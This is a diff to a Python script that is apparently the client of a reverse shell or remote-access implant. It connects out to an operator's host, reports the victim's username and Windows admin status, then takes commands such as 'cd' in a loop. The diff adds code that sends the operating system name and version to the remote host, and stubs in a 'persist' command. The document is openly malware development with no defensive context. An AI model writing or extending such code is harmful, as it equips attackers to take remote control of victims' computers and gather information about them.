@@ -1,8 +1,9 @@
 import socket
 import subprocess
 import os
-import sys
 import ctypes
+import platform
+import time
 
 def inbound():
     print('[+] Awaiting response...')
@@ -23,6 +24,10 @@ def session_handler():
     sock.connect((host_ip, host_port))
     outbound(os.getlogin())
     outbound(ctypes.windll.shell32.IsUserAnAdmin())
+    time.sleep(1)
+    op_sys = platform.uname()
+    op_sys = (f'{op_sys[0]} {op_sys[2]}')
+    outbound(op_sys)
     print(f'[+] Connected to {host_ip}.')
     while True:
         message = inbound()
@@ -31,6 +36,8 @@ def session_handler():
              print('[-] The server has terminated the session.')
              sock.close()
              break
+        elif message == 'persist':
+            pass
         elif message.split(" ")[0] == 'cd':
             try:
                 directory = str(message.split(" ")[1])
